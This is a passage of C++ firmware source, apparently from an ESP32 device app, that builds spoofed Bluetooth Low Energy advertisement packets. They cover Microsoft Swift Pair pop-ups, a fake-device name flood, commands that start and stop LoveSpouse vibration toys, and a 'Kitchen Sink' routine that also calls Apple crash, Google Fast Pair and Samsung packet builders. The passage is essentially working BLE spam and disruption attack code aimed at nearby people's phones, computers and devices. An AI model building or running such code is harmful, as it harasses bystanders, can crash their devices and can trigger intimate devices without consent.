    buf[i++] = 0x43;
    buf[i++] = model;

    len = i;
}

/* ── Microsoft Swift Pair ── */
void App07::_makePacketSwiftPair(uint8_t* buf, uint8_t& len)
{
    const char* name = random_names[esp_random() % NAMES_COUNT];
    uint8_t nameLen = strlen(name);
    if (nameLen > 20) nameLen = 20;  // keep within BLE limit (3 Flags + 7 hdr + 20 = 30 < 31)

    uint8_t i = 0;
    buf[i++] = 2;     buf[i++] = 0x01; buf[i++] = 0x06;  // Flags: General Discoverable

    buf[i++] = 6 + nameLen;  // Size
    buf[i++] = 0xFF;         // Manufacturer Specific
    buf[i++] = 0x06;         // Microsoft
    buf[i++] = 0x00;
    buf[i++] = 0x03;         // Microsoft Beacon ID
    buf[i++] = 0x00;         // Sub Scenario
    buf[i++] = 0x80;         // Reserved RSSI
    memcpy(&buf[i], name, nameLen);
    i += nameLen;

    len = i;
}

/* ── Name Flood (BT Settings) ── */
void App07::_makePacketNameFlood(uint8_t* buf, uint8_t& len)
{
    const char* name = random_names[esp_random() % NAMES_COUNT];
    uint8_t nameLen = strlen(name);
    if (nameLen > 18) nameLen = 18;

    uint8_t i = 0;
    buf[i++] = 2;     // Size
    buf[i++] = 0x01;  // AD Type: Flags
    buf[i++] = 0x06;  // Flags

    buf[i++] = nameLen + 1;  // Size
    buf[i++] = 0x09;         // AD Type: Complete Local Name
    memcpy(&buf[i], name, nameLen);
    i += nameLen;

    buf[i++] = 3;     // Size
    buf[i++] = 0x02;  // AD Type: Incomplete Service UUID List
    buf[i++] = 0x12;  // HID Service
    buf[i++] = 0x18;

    buf[i++] = 2;     // Size
    buf[i++] = 0x0A;  // AD Type: Tx Power Level
    buf[i++] = 0x00;  // 0 dBm

    len = i;
}

/* ── LoveSpouse: Activate ── */
void App07::_makePacketLoveSpousePlay(uint8_t* buf, uint8_t& len)
{
    uint32_t mode = ls_play_modes[esp_random() % LS_PLAY_COUNT];

    uint8_t i = 0;
    buf[i++] = 2;     buf[i++] = 0x01; buf[i++] = 0x1A;  // Flags

    buf[i++] = 14;    // Size
    buf[i++] = 0xFF;  // Manufacturer Specific
    buf[i++] = 0xFF;  // Typo Products, LLC
    buf[i++] = 0x00;
    buf[i++] = 0x6D;
    buf[i++] = 0xB6;
    buf[i++] = 0x43;
    buf[i++] = 0xCE;
    buf[i++] = 0x97;
    buf[i++] = 0xFE;
    buf[i++] = 0x42;
    buf[i++] = 0x7C;
    buf[i++] = (mode >> 16) & 0xFF;
    buf[i++] = (mode >> 8)  & 0xFF;
    buf[i++] = mode & 0xFF;

    buf[i++] = 3;     buf[i++] = 0x03;  // Service UUID List
    buf[i++] = 0x8F;  buf[i++] = 0xAE;

    len = i;
}

/* ── LoveSpouse: Stop ── */
void App07::_makePacketLoveSpouseStop(uint8_t* buf, uint8_t& len)
{
    uint32_t mode = ls_stop_modes[esp_random() % LS_STOP_COUNT];

    uint8_t i = 0;
    buf[i++] = 2;     buf[i++] = 0x01; buf[i++] = 0x1A;

    buf[i++] = 14;
    buf[i++] = 0xFF;
    buf[i++] = 0xFF;  buf[i++] = 0x00;
    buf[i++] = 0x6D;  buf[i++] = 0xB6;
    buf[i++] = 0x43;  buf[i++] = 0xCE;
    buf[i++] = 0x97;  buf[i++] = 0xFE;
    buf[i++] = 0x42;  buf[i++] = 0x7C;
    buf[i++] = (mode >> 16) & 0xFF;
    buf[i++] = (mode >> 8)  & 0xFF;
    buf[i++] = mode & 0xFF;

    buf[i++] = 3;     buf[i++] = 0x03;
    buf[i++] = 0x8F;  buf[i++] = 0xAE;

    len = i;
}

/* ── Kitchen Sink: cycle through all protocols randomly ── */
void App07::_makePacketKitchenSink(uint8_t* buf, uint8_t& len)
{
    /* Pick a random protocol each call */
    int proto = esp_random() % 10;  // 10 packet types (excluding kitchen sink itself)
    switch (proto) {
    case 0: _makePacketAppleCrash(buf, len);     break;
    case 1: _makePacketAppleAction(buf, len);    break;
    case 2: _makePacketAppleDevice(buf, len);    break;
    case 3: _makePacketFastPair(buf, len);       break;
    case 4: _makePacketEasySetupBuds(buf, len);  break;
    case 5: _makePacketEasySetupWatch(buf, len); break;
    case 6: _makePacketSwiftPair(buf, len);      break;
    case 7: _makePacketNameFlood(buf, len);      break;
    case 8: _makePacketLoveSpousePlay(buf, len); break;
    case 9: _makePacketLoveSpouseStop(buf, len); break;
    }
}

} // namespace MOONCAKE::APPS
